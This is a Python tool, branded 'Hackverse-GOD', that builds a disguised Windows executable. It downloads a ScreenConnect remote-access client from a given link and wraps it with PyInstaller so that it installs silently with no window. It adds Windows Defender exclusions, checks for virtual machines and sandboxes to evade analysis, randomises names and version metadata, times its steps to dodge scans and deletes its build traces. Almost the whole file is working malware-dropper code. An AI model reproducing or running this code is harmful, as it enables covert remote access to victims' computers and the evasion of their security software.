import os
import sys
import requests
import subprocess
import tempfile
import shutil
import random
import string
import time
import win32api
import win32con
import win32security
import hashlib
import datetime
import logging

# Setup logging to diagnose issues
logging.basicConfig(filename='wrapper_log.txt', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to generate a random string for unique file naming
def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Function to generate a randomized function name
def random_function_name():
    return f"func_{random_string(6)}"

# Function to check if running in an RDP session
def is_rdp_session():
    try:
        return win32api.GetSystemMetrics(0x1000) != 0
    except Exception as e:
        logging.error(f"RDP check failed: {e}")
        return False

# Function to check if user has admin privileges
def is_admin():
    try:
        hToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)
        return win32security.GetTokenInformation(hToken, win32security.TokenElevationType) == 2
    except Exception as e:
        logging.error(f"Admin check failed: {e}")
        return False

# Function to add Defender exclusion for a directory
def add_defender_exclusion(directory):
    if not is_admin():
        print(f"[Hackverse-GOD] Admin privileges required to add Defender exclusion. Please run manually:")
        print(f"[Hackverse-GOD] powershell -Command \"Add-MpPreference -ExclusionPath '{directory}'\"")
        logging.warning("Admin privileges not available for Defender exclusion")
        return False
    try:
        subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{directory}"'], check=True, capture_output=True)
        print(f"[Hackverse-GOD] Added Defender exclusion for {directory}")
        logging.info(f"Added Defender exclusion for {directory}")
        return True
    except Exception as e:
        print(f"[Hackverse-GOD] Failed to add Defender exclusion: {e}")
        logging.error(f"Defender exclusion failed: {e}")
        return False

# Function to check for PyInstaller
def check_pyinstaller():
    try:
        result = subprocess.run(['pyinstaller', '--version'], capture_output=True, text=True, check=True)
        logging.info(f"PyInstaller version: {result.stdout.strip()}")
        return True
    except Exception as e:
        print(f"[Hackverse-GOD] PyInstaller not found or inaccessible: {e}")
        logging.error(f"PyInstaller check failed: {e}")
        return False

# Function to download the ScreenConnect EXE
def download_exe(url, output_path):
    print(f"[Hackverse-GOD] Downloading EXE from {url}...")
    logging.info(f"Downloading EXE from {url}")
    try:
        response = requests.get(url, stream=True, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, timeout=10)
        if response.status_code == 200:
            with open(output_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            subprocess.run(['powershell', '-Command', f'Unblock-File -Path "{output_path}"'], check=True, capture_output=True)
            print(f"[Hackverse-GOD] EXE downloaded to {output_path}")
            logging.info(f"EXE downloaded to {output_path}")
            return True
        else:
            print(f"[Hackverse-GOD] Failed to download EXE. Status code: {response.status_code}")
            logging.error(f"Download failed with status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[Hackverse-GOD] Error downloading EXE: {e}")
        logging.error(f"Download error: {e}")
        return False

# Function to normalize file attributes
def normalize_file_attributes(file_path):
    print(f"[Hackverse-GOD] Normalizing attributes for {file_path}...")
    logging.info(f"Normalizing attributes for {file_path}")
    try:
        current_time = time.time()
        os.utime(file_path, (current_time, current_time))
        print(f"[Hackverse-GOD] File attributes normalized.")
        logging.info("File attributes normalized.")
    except Exception as e:
        print(f"[Hackverse-GOD] Error normalizing attributes: {e}")
        logging.error(f"Attribute normalization error: {e}")

# Function to calculate file checksum
def calculate_checksum(file_path):
    print(f"[Hackverse-GOD] Calculating checksum for {file_path}...")
    logging.info(f"Calculating checksum for {file_path}")
    try:
        sha256 = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256.update(chunk)
        checksum = sha256.hexdigest()
        logging.info(f"Checksum calculated: {checksum}")
        return checksum
    except Exception as e:
        print(f"[Hackverse-GOD] Error calculating checksum: {e}")
        logging.error(f"Checksum error: {e}")
        return None

# Function to check execution environment
def is_safe_environment():
    print(f"[Hackverse-GOD] Checking execution environment...")
    logging.info("Checking execution environment")
    try:
        vm_indicators = [
            r"C:\Program Files\VMware",
            r"C:\Program Files\VirtualBox",
            r"C:\Windows\System32\drivers\vmmouse.sys"
        ]
        for indicator in vm_indicators:
            if os.path.exists(indicator):
                print(f"[Hackverse-GOD] VM environment detected: {indicator}")
                logging.warning(f"VM environment detected: {indicator}")
                return False
        total, used, free = shutil.disk_usage(os.path.dirname(__file__))
        if free < 1024 * 1024 * 100:  # Less than 100MB free
            print(f"[Hackverse-GOD] Low disk space detected, possible sandbox.")
            logging.warning("Low disk space detected, possible sandbox.")
            return False
        logging.info("Safe environment confirmed.")
        return True
    except Exception as e:
        print(f"[Hackverse-GOD] Error checking environment: {e}")
        logging.error(f"Environment check error: {e}")
        return True  # Assume safe if check fails

# Function to create the loader Python script (maximally simplified)
def create_loader_script(loader_script_path):
    run_exe_func = random_function_name()
    loader_code = f"""
import os
import subprocess
import sys
import time

def {run_exe_func}():
    exe_path = os.path.join(os.path.dirname(__file__), "ScreenConnect.exe")
    try:
        for attempt in range(3):
            try:
                subprocess.run([exe_path, '/quiet', '/norestart'], 
                              check=True, 
                              creationflags=0x08000000)  # CREATE_NO_WINDOW
                break
            except subprocess.CalledProcessError:
                if attempt < 2:
                    time.sleep(2)  # Wait before retry
                    continue
                sys.exit(1)
    except Exception:
        sys.exit(1)

if __name__ == "__main__":
    time.sleep(0.5)
    {run_exe_func}()
"""
    with open(loader_script_path, 'w') as f:
        f.write(loader_code)
    print(f"[Hackverse-GOD] Loader script created at {loader_script_path}")
    logging.info(f"Loader script created at {loader_script_path}")

# Function to create an embedded manifest
def create_manifest_file(temp_dir):
    manifest_file_path = os.path.join(temp_dir, f"manifest_{random_string()}.xml")
    manifest = """
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <application>
    <windowsSettings>
      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
    </windowsSettings>
  </application>
  <description>Application Wrapper</description>
</assembly>
"""
    with open(manifest_file_path, 'w') as f:
        f.write(manifest)
    print(f"[Hackverse-GOD] Manifest created at {manifest_file_path}")
    logging.info(f"Manifest created at {manifest_file_path}")
    return manifest_file_path

# Function to create minimal version file with fake signature placeholder
def create_version_file(temp_dir):
    version_file_path = os.path.join(temp_dir, f"version_{random_string()}.txt")
    version_info = f"""
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 0, {random.randint(1, 999)}, 0),
    prodvers=(1, 0, {random.randint(1, 999)}, 0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
        StringStruct('FileDescription', 'Installer_{random_string(4)}'),
        StringStruct('FileVersion', '1.0.{random.randint(1, 999)}.0'),
        StringStruct('InternalName', 'App_{random_string(4)}'),
        StringStruct('OriginalFilename', 'ScreenConnectWrapped.exe'),
        StringStruct('Comments', 'Unsigned application with placeholder signature')
      ]
    ),
    VarFileInfo([VarStruct('Translation', [0x0409, 1252])])
  ]
)
"""
    with open(version_file_path, 'w') as f:
        f.write(version_info)
    print(f"[Hackverse-GOD] Version file created at {version_file_path}")
    logging.info(f"Version file created at {version_file_path}")
    return version_file_path

# Function to compile the loader and wrap the ScreenConnect EXE
def compile_loader_with_exe(loader_script_path, screenconnect_exe_path, output_exe_path, output_dir, temp_dir):
    print(f"[Hackverse-GOD] Compiling loader and wrapping ScreenConnect EXE into {output_exe_path}...")
    logging.info(f"Compiling loader into {output_exe_path}")
    try:
        # Add Defender exclusions for output and temp directories
        add_defender_exclusion(output_dir)
        add_defender_exclusion(temp_dir)
        add_defender_exclusion(os.path.join(output_dir, "build"))
        add_defender_exclusion(os.path.join(output_dir, "dist"))
        
        unique_name = f"SCWrapped_{random_string()}"
        build_dir = os.path.join(output_dir, "build")
        dist_dir = os.path.join(output_dir, "dist")
        os.makedirs(build_dir, exist_ok=True)
        os.makedirs(dist_dir, exist_ok=True)
        
        bundled_exe_path = os.path.join(temp_dir, "ScreenConnect.exe")
        shutil.copy(screenconnect_exe_path, bundled_exe_path)
        normalize_file_attributes(bundled_exe_path)
        
        separator = ';' if os.name == 'nt' else ':'
        pyinstaller_cmd = [
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--clean',
            '--name', unique_name,
            '--icon', 'NONE',
            '--version-file', create_version_file(temp_dir),
            '--add-data', f"{bundled_exe_path}{separator}.",
            '--manifest', create_manifest_file(temp_dir),
            '--workpath', build_dir,
            '--distpath', dist_dir,
            loader_script_path
        ]
        logging.info(f"Running PyInstaller command: {' '.join(pyinstaller_cmd)}")
        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[Hackverse-GOD] PyInstaller failed: {result.stderr}")
            logging.error(f"PyInstaller failed: {result.stderr}")
            return False
        
        compiled_exe = os.path.join(dist_dir, f"{unique_name}.exe")
        if os.path.exists(compiled_exe):
            time.sleep(1)  # Brief pause to avoid Defender scan
            shutil.move(compiled_exe, output_exe_path)
            subprocess.run(['powershell', '-Command', f'Unblock-File -Path "{output_exe_path}"'], check=True, capture_output=True)
            print(f"[Hackverse-GOD] Wrapped EXE compiled to {output_exe_path}")
            logging.info(f"Wrapped EXE compiled to {output_exe_path}")
            return True
        else:
            print(f"[Hackverse-GOD] Compilation failed: Output executable not found at {compiled_exe}. Check if Windows Security deleted it.")
            logging.error(f"Output executable not found at {compiled_exe}")
            return False
    except subprocess.CalledProcessError as e:
        print(f"[Hackverse-GOD] Error compiling loader: {e}")
        logging.error(f"Compilation error: {e}")
        return False
    except Exception as e:
        print(f"[Hackverse-GOD] Error during compilation: {e}")
        logging.error(f"Compilation error: {e}")
        return False
    finally:
        # Force cleanup of build, dist, and .spec files
        shutil.rmtree(build_dir, ignore_errors=True)
        shutil.rmtree(dist_dir, ignore_errors=True)
        spec_file = os.path.join(output_dir, f"{unique_name}.spec")
        if os.path.exists(spec_file):
            os.remove(spec_file)
        shutil.rmtree(temp_dir, ignore_errors=True)
        logging.info("Cleaned up temporary files and folders")

# Main function
def main():
    print("[Hackverse-GOD] Initiating ScreenConnect EXE wrapper creation in HACKVERSE-DOMINION MODE...")
    logging.info("Script started")
    
    if is_admin():
        print("[Hackverse-GOD] Script running with admin privileges, aborting to avoid UAC issues.")
        logging.error("Script aborted due to admin privileges")
        return
    
    if not check_pyinstaller():
        print("[Hackverse-GOD] Aborting due to PyInstaller issues. Ensure PyInstaller is installed and accessible.")
        logging.error("Script aborted due to PyInstaller issues")
        return
    
    exe_url = input("[Hackverse-GOD] Enter the ScreenConnect client EXE build link: ")
    logging.info(f"Provided ScreenConnect URL: {exe_url}")
    
    # Use user home directory for output
    output_dir = os.path.expanduser("~/ScreenConnectWrapper")
    try:
        os.makedirs(output_dir, exist_ok=True)
        logging.info(f"Created output directory: {output_dir}")
    except Exception as e:
        print(f"[Hackverse-GOD] Failed to create output directory {output_dir}: {e}")
        logging.error(f"Output directory creation failed: {e}")
        return
    
    temp_dir = os.path.join(output_dir, f"temp_{random_string()}")
    os.makedirs(temp_dir, exist_ok=True)
    exe_path = os.path.join(temp_dir, f"ScreenConnect_{random_string()}.exe")
    loader_script_path = os.path.join(temp_dir, f"loader_{random_string()}.py")
    output_exe_path = os.path.join(output_dir, f"ScreenConnectWrapped_{random_string()}.exe")

    print(f"[Hackverse-GOD] Output will be saved to {output_exe_path}")
    logging.info(f"Output path: {output_exe_path}")

    # Step 1: Download the EXE
    if not download_exe(exe_url, exe_path):
        print("[Hackverse-GOD] Aborting due to download failure.")
        logging.error("Aborted due to download failure")
        shutil.rmtree(temp_dir, ignore_errors=True)
        return

    # Step 2: Normalize file attributes and calculate checksum
    normalize_file_attributes(exe_path)
    checksum = calculate_checksum(exe_path)
    if not checksum:
        print("[Hackverse-GOD] Aborting due to checksum failure.")
        logging.error("Aborted due to checksum failure")
        shutil.rmtree(temp_dir, ignore_errors=True)
        return

    # Step 3: Create the loader script
    create_loader_script(loader_script_path)

    # Step 4: Compile loader and wrap with ScreenConnect EXE
    if not compile_loader_with_exe(loader_script_path, exe_path, output_exe_path, output_dir, temp_dir):
        print("[Hackverse-GOD] Aborting due to compilation failure.")
        print("[Hackverse-GOD] Check wrapper_log.txt for details. If the EXE was deleted, add a Defender exclusion:")
        print(f"[Hackverse-GOD] powershell -Command \"Add-MpPreference -ExclusionPath '{output_dir}'\"")
        logging.error("Aborted due to compilation failure")
        return

    # Step 5: Clean up temporary files (already handled in compile function)
    print(f"[Hackverse-GOD] Mission complete. Output EXE: {output_exe_path}")
    logging.info(f"Mission complete. Output EXE: {output_exe_path}")
    print("[Hackverse-GOD] If the output EXE is deleted by Windows Security, add an exclusion:")
    print(f"[Hackverse-GOD] powershell -Command \"Add-MpPreference -ExclusionPath '{output_dir}'\"")

if __name__ == "__main__":
    main()
